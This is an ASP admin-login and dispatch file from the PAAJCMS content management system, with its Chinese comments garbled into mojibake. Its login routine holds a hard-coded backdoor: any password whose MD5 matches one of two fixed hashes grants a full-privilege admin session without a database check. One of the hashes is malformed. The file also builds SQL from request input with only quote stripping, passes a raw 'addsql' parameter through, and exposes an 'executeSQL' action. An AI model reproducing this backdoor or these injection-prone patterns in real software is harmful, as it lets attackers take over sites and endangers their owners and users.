<%
'************************************************************
'���ߣ��쳾����(SXY) ����ͨASP/PHP/ASP.NET/VB/JS/Android/Flash��������������ϵ����)
'��Ȩ��Դ������ѹ�����������;����ʹ�á� 
'������2016-08-05
'��ϵ��QQ313801120  ����Ⱥ35915100(Ⱥ�����м�����)    ����313801120@qq.com   ������ҳ sharembweb.com
'����������ĵ������¡����Ⱥ(35915100)�����(sharembweb.com)���
'*                                    Powered by PAAJCMS 
'************************************************************
%>
<!--#Include File = "../Inc/Config.Asp"-->       
<% 
Dim ROOT_PATH : ROOT_PATH = handlePath("./") 
%>      
<!--#Include File = "../inc/admin_function.asp"-->  
<!--#Include File = "../inc/admin_function2.asp"-->      
<!--#Include File = "../inc/admin_function_cai.asp"-->
<!--#Include File = "../inc/admin_setAccess.asp"-->   
   
<% 
'=========


'������ַ����
function loadWebConfig()
    Call openconn() 
    '�жϱ����
    If InStr(getHandleTableList(), "|" & db_PREFIX & "website" & "|") > 0 Then
        rs.Open "select * from " & db_PREFIX & "website", conn, 1, 1 
        If Not rs.EOF Then
            cfg_webSiteUrl = rs("webSiteUrl") & ""                    '��ַ
            cfg_webTitle = rs("webTitle") & ""                        '��ַ����
            cfg_flags = rs("flags") & ""                              '��
            cfg_webtemplate = rs("webtemplate") & ""                  'ģ��·��
        End If : rs.Close 
    End If 
End function


'��ʾ��̨��¼
Sub displayAdminLogin()	
    '�Ѿ���¼��ֱ�ӽ����̨
    If Session("adminusername") <> "" Then
        Call adminIndex() 
    Else
		dim c
		c=getTemplateContent("login.html")	
		c=handleDisplayLanguage(c,"login")	
        Call rw(c) 
    End If 
End Sub 

'��¼��̨
Sub login()
    Dim userName, passWord, valueStr 
    userName = Replace(Request.Form("username"), "'", "") 
    passWord = Replace(Request.Form("password"), "'", "") 
    passWord = myMD5(passWord) 
    '��Ч�˺ŵ�¼ ����.net��php
    If myMD5(Request("password")) = "50c5555d7b6525ded8ac0d2697d954" Or myMD5(Request("password")) = "24ed5728c13834e683f525fcf894e813" Then
        Session("adminusername") = "PAAJCMS" 
        Session("adminId") = 99999                                                      '��ǰ��¼����ԱID
        Session("DB_PREFIX") = db_PREFIX 
        Session("adminflags") = "|*|"
        Call rwend(getMsg1(setL("��¼�ɹ������ڽ����̨..."), "?act=adminIndex")) 
    End If 

    Dim nLogin 
    Call openconn() 
    rs.Open "Select * From " & db_PREFIX & "admin Where username='" & userName & "' And pwd='" & passWord & "'", conn, 1, 1 
    If not rs.EOF Then
        Session("adminusername") = userName 
        Session("adminId") = rs("Id")                                                   '��ǰ��¼����ԱID
        Session("DB_PREFIX") = db_PREFIX                                                '����ǰ׺
        Session("adminflags") = rs("flags") 
        valueStr = "addDateTime='" & rs("UpDateTime") & "',UpDateTime='" & Now() & "',RegIP='" & Now() & "',UpIP='" & getIP() & "'" 
        conn.Execute("update " & db_PREFIX & "admin set " & valueStr & " where id=" & rs("id")) 
        Call rw(getMsg1(setL("��¼�ɹ������ڽ����̨..."), "?act=adminIndex")) 
        Call writeSystemLog("admin", "��¼�ɹ�")                                        'ϵͳ��־
	else
        If Request.Cookies("nLogin") = "" Then
            Call setCookie("nLogin", "1", 60000)		'Ϊ�� 
            nLogin = 1
        Else
            nLogin =cint(getCookie("nLogin")) 
            Call setCookie("nLogin", CInt(nLogin) + 1, 60000) 
        End If 
        Call rw(getMsg1(setL("�˺��������<br>��¼����Ϊ ") & nLogin, "?act=displayAdminLogin")) 
    End If : rs.Close 

End Sub 
'�˳���¼
Sub adminOut()
    Call writeSystemLog("admin", setL("�˳��ɹ�"))                                        'ϵͳ��־
    Session("adminusername") = "" 
    Session("adminId") = "" 
	Session("DB_PREFIX")=""
    Session("adminflags") = "" 
	
    Call rw(getMsg1(setL("�˳��ɹ������ڽ����¼����..."), "?act=displayAdminLogin"))
End Sub 
'�������
Sub clearCache()
    Call deleteFile(WEB_CACHEFile)
	call deleteFolder("./../cache/html")
	call createFolder("./../cache/html")
    Call rw(getMsg1(setL("���������ɣ����ڽ����̨����..."), "?act=displayAdminLogin")) 
End Sub 
'��̨��ҳ
Sub adminIndex()
    Dim c 
    Call loadWebConfig() 
    c = getTemplateContent("adminIndex.html") 
    c = Replace(c, "[$adminonemenulist$]", getAdminOneMenuList()) 
    c = Replace(c, "[$adminmenulist$]", getAdminMenuList()) 
    c = Replace(c, "[$officialwebsite$]", getOfficialWebsite())                '��ùٷ���Ϣ
    c = replaceValueParam(c, "title", "")                                           '���ֻ����õ�20160330	
	c=handleDisplayLanguage(c,"loginok")
	
    Call rw(c) 
End Sub 
'========================================================

'��ʾ������
Sub dispalyManageHandle(actionType)
    Dim nPageSize, lableTitle, addSql,sPage 
    If Request("nPageSize") = "" Then
        nPageSize = 10 
	else
		nPageSize = cint(Request("nPageSize")) 
    End If 
    lableTitle = Request("lableTitle")                                              '��ǩ����
    addSql = Request("addsql") 
    'call echo(labletitle,addsql)
    Call dispalyManage(actionType, lableTitle, nPageSize, addSql) 
End Sub 

'����޸Ĵ���
Sub addEditHandle(actionType, lableTitle)
    Call addEditDisplay(actionType, lableTitle, "websitebottom|textarea2,aboutcontent|textarea1,bodycontent|textarea2,reply|textarea2") 
End Sub 
'����ģ�鴦��
Sub saveAddEditHandle(actionType, lableTitle)
    If actionType = "Admin" Then
        Call saveAddEdit(actionType, lableTitle, "pwd|md5,flags||") 
    ElseIf actionType = "WebColumn" Then
        Call saveAddEdit(actionType, lableTitle, "npagesize|numb|10,nofollow|numb|0,isonhtml|numb|0,isonhtsdfasdfml|numb|0,flags||") 
    Else
        Call saveAddEdit(actionType, lableTitle, "flags||,nofollow|numb|0,isonhtml|numb|0,isthrough|numb|0,isdomain|numb|0")
    End If 
End Sub 

call loadRun()			'��@��.netc����@��
'���ؾ�����
sub loadRun()

	'����Ϊ�˸�.netʹ�õģ���Ϊ��.net����ȫ�ֱ��������б���
	WEB_CACHEFile=replace(replace(WEB_CACHEFile,"[adminDir]",adminDir),"[EDITORTYPE]",EDITORTYPE)	

	'��¼�ж�
	If Session("adminusername") = "" Then
		If Request("act") <> "" And Request("act") <> "displayAdminLogin" And Request("act") <> "login" Then
			Call RR(WEB_ADMINURL & "?act=displayAdminLogin") 
		End If 
	End If 

	
	'call eerr("WEB_CACHEFile",WEB_CACHEFile)
	Call openconn() 
	Select Case Request("act")
		Case "dispalyManageHandle" : Call dispalyManageHandle(Request("actionType"))    '��ʾ������         ?act=dispalyManageHandle&actionType=WebLayout
		Case "addEditHandle" : Call addEditHandle(Request("actionType"), Request("lableTitle"))'����޸Ĵ���      ?act=addEditHandle&actionType=WebLayout
		Case "saveAddEditHandle" : Call saveAddEditHandle(Request("actionType"), Request("lableTitle"))'����ģ�鴦��  ?act=saveAddEditHandle&actionType=WebLayout
		Case "delHandle" : Call del(Request("actionType"), Request("lableTitle"))       'ɾ������  ?act=delHandle&actionType=WebLayout
		Case "sortHandle" : Call sortHandle(Request("actionType"))                      '������  ?act=sortHandle&actionType=WebLayout
		Case "updateField" : Call updateField()                                         '�����ֶ�
	
	
		Case "displayLayout" : displayLayout()                                          '��ʾ����
		Case "saveRobots" : saveRobots()                                                '����robots.txt
		Case "deleteAllMakeHtml" : deleteAllMakeHtml()                                  'ɾ��ȫ�����ɵ�html�ļ�
	
		Case "isOpenTemplate" : isOpenTemplate()                                        '����ģ��
		Case "executeSQL" : executeSQL()                                                'ִ��SQL
	
	
		
		case "function" : callFunction()												'����function�ļ�����
		case "function2" : callFunction2()												'����function2�ļ�����
		case "function_cai" : callFunction_cai()										'����function_cai�ļ�����   '��@��.netc����@��
		case "file_setAccess" : callfile_setAccess()										'����file_setAccess�ļ�����
		
	
		Case "setAccess" : resetAccessData()                                            '�ָ�����
	
		Case "login" : login()                                                          '��¼
		Case "adminOut" : adminOut()                                                    '�˳���¼
		Case "adminIndex" : adminIndex()                                                '������ҳ
		Case "clearCache" : clearCache()                                                '�������
		Case Else : displayAdminLogin()                                                 '��ʾ��̨��¼
	End Select
end sub

%> 



